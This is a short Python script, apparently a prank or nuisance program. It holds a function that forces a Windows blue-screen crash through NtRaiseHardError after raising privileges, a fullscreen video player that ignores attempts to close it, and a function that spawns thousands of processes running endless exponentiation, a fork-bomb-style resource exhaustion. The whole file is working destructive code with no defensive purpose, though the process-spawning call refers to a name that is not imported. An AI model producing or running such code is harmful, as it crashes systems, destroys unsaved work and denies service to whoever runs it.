import pygame
from moviepy.editor import VideoFileClip
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
from multiprocessing import Process

def bsod():
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))

def play_audio(file):
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(file)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)

def play_video(video_path):
    pygame.init()
    video = VideoFileClip(video_path)
    audio = video.audio
    audio.write_audiofile("temp_audio.wav")
    pygame.display.init()
    screen = pygame.display.set_mode(video.size, pygame.FULLSCREEN)
    clock = pygame.time.Clock()
    audio_start_time = pygame.mixer.music.get_pos()
    pygame.mixer.music.load("temp_audio.wav")
    pygame.mixer.music.play(start=audio_start_time / 1000)
    for frame in video.iter_frames(fps=video.fps):
        pygame_frame = pygame.image.frombuffer(frame.tobytes(), video.size, 'RGB')
        screen.blit(pygame_frame, (0, 0))
        pygame.display.flip()
        clock.tick(video.fps)
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass
        if not pygame.mixer.music.get_busy():
            break
    pygame.mixer.music.stop()
    pygame.quit()

def _work():
    x = 99999
    while True:
        x **= x
        print(x)

def lag(x=10000):
    for _ in range(x):
        p = multiprocessing.Process(target=_work)
        p.start()
